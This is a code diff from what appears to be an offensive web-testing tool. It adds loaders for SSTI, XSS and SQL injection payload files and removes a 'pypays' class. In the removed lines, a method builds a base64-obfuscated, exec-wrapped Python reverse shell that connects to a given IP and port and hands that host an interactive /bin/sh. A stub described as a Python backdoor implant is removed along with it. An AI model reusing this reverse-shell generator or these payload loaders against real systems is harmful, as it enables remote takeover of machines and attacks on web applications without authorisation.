@@ -28,35 +28,12 @@ class VMNFPayloads:
     def get_random_credential(self):
         gen = mimesis.Generic(choice([loc for loc in mimesis.locales.LIST_OF_LOCALES]))
         return {'username':gen.person.username(),'password':gen.person.password()}
-
-    
-class pypays:
-    def __init__(self):
-        '''*'''
-    def olbsp(
-        self,
-        ip=False, 
-        port=False
-        ):
-        ''' - One-liner /bin/sh payload - '''
-        
-        # 0-65535 check to prevent overflowerror
-        return('import base64;exec(base64.b64decode(' + \
-            str(base64.b64encode(\
-                """import os,\
-                socket,\
-                subprocess;\
-                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
-                s.connect(('{}',{}));\
-                os.dup2(s.fileno(),0);\
-                os.dup2(s.fileno(),1);\
-                os.dup2(s.fileno(),2);\
-                p=subprocess.Popen(["/bin/sh","-i"],close_fds=True);
-                """.format(ip,port).encode('ascii')
-                )
-            ) + '))'
-        )
-
-
-    def pybackdoor(self):
-        '''python backdoor implante'''
+    def get_ssti_payloads(self):
+        with open('resources/attack/payloads/ssti.txt') as f:
+            return [p.strip() for p in f.readlines()[1:]]
+    def get_xss_payloads(self):
+        with open('resources/attack/payloads/xss.txt') as f:
+            return [p.strip() for p in f.readlines()[1:]]
+    def get_sqli_payloads(self):
+        with open('resources/attack/payloads/sqli.txt') as f:
+            return [p.strip() for p in f.readlines()[1:]]
